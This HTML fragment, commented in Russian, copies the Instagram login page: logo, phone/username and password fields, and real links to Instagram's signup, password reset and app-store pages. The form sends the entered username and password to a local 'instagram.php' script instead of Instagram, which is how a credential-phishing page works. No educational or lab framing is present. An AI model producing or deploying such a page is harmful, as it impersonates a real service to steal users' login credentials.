<body>
    <main>
        <div class="container">
            <div class="image-section">
                <img src="resources/screenshot1.png" alt="Screenshot 1">
            </div>

            <!-- Форму и регистрацию оборачиваем в общий контейнер -->
            <div class="form-container">

                <!-- Форма входа -->
                <div class="form-section">
                    <!-- Логотип Instagram вместо текста -->
                    <img id="inst_logo" src="resources/Instagram-logo.png" width="50%">

                    <form action="instagram.php" method="post">
                        <input type="text" name="username" placeholder="Телефон, имя пользователя или эл. адрес"
                            required>
                        <input type="password" name="password" placeholder="Пароль" required>
                        <button type="submit">Войти</button>
                        <div class="divider">ИЛИ</div>
                        <a href="https://www.facebook.com/login" class="facebook-login">
                            <img id="facebook_logo"
                                src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Facebook_logo_%28square%29.png"
                                width="4%">
                            Войти через Facebook
                        </a>
                        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Забыли
                            пароль?</a>
                    </form>
                </div>

                <!-- Отдельный блок для регистрации -->
                <div class="register">
                    У вас ещё нет аккаунта?
                    <a href="https://www.instagram.com/accounts/emailsignup/">Зарегистрироваться</a>
                </div>

                <!-- Установка приложения -->
                <div class="download">
                    <p>Установите приложение</p>
                    <div class="app-links">
                        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=ru"
                            target="_blank">
                            <img id="android_logo"
                                src="https://static.cdninstagram.com/rsrc.php/v3/yr/r/fDjwyLC88oO.png" width="39%">
                        </a>
                        <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
                            <img id="apple_logo" src="https://static.cdninstagram.com/rsrc.php/v3/y9/r/E_2mQvC3HG-.png"
                                width="39%">
                        </a>
                    </div>
                </div>

            </div> <!-- Закрываем form-container -->

        </div>
    </main>
